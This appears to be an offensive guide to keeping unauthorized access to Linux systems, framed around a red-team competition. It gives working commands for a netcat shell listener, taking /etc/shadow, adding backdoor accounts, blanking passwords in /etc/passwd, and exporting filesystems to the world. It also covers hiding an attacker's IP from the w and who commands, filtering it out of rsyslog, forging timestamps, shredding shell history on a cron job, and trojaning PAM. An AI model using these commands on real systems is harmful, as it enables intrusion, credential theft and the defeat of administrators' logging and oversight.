# Linux Persistence

This document will show various ways to persist on a Linux system.

## General Tips for Linux Persistence

This blurb taken from James Golovich at Cyberforce 2019, with additional contribution by Dan Fedele

**As a non-privileged user**

*  Create ssh keys (ssh-keygen). If a password is changed or the account locked you can usually still login via ssh with a key.  Generate one key and use it everywhere so you don't have to juggle keys around and remember which goes where.
*  Install scripts in cron or at
*  Setup shell listener (rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 1234 > /tmp/f)

**As root**

* Exfiltrate /etc/shadow file to crack newly changed passwords
* Add a new account (useradd or directly in /etc/passwd, /etc/shadow)
* Modify /etc/passwd and remove the 'x' from the password field (2nd field), this sets the account to no password and is often overlooked because everyone assumes the password is always in the shadow file
* Install and startup nfs-server.  Export filesystems to world
* Export filesystems via samba
* Copy a real shell to /usr/sbin/nologin, /sbin/nologin, or /bin/false to allow special accounts to login  (this is already done on Centos + Ubuntu)
* Hide the low-hanging fruit commands that some less-experienced admins would use to determine presence:
  * `echo 'alias w="w | grep -v <your ip here>" >> /etc/bash.bashrc && alias who="who | grep -v <your ip here>" >> /etc/bash.bashrc'`
* Remove your IP from logs like SSH auth logs and other similar things.
  * Add the line `:msg,contains, "<your ip here>" ~` to /etc/rsyslog.conf before any other rules get added, then restart rsyslog. Replace with your IP obviously.
  * TODO: Add similar lines for syslog-ng and logstash

## Hide your tracks, think like an admin

Put your sysadmin hat on and think about what you would do if you have reason to believe that you are logging into a compromised server. What actions would you take (aside from pulling the plug for forensic analysis)?

Aside from seeing if someone were on your box *right now,* they would probably poke around and look for recent changes. One such check:

`find / -mtime -7`

Which will look for files modified within the past 7 days. You can fudge the numbers of files you create or modify with the "touch" command:

```bash
$ HIDDEN_TS=$(stat -c '%y' /etc/rc.local)
$ touch -d "$HIDDEN_TS" /path/to/modified/file
```

## Hide your tracks, wipe the history

Most shells will leave a history file behind. When it comes to bash, there are a few things you can do.

**Before the Attack**
* Prevent your history file from being written with: `export HISTSIZE=0`
  * Note that this will disable a history completely, meaning you can't use the up arrow to recall your last command.

**After the Attack**
* You can clear the current history with: `history -w`
* You can nuke all of your user's history with: `cat /dev/null > ~.bash_history && history -c && exit`
* Nuke your user's history from orbit: `shred ~/.bash_history`

You can set this to work automatically too:

1. Create a new crontab entry with: `crontab -e`
1. Add: `1 * * * * shred ~/.bash_history && cat /dev/null > .bash_history`

## Trojan the Pam Stack

When all else fails, trojan the pam stack. Really difficult to discover if done properly! 

https://github.com/AgroDan/trojan_pam
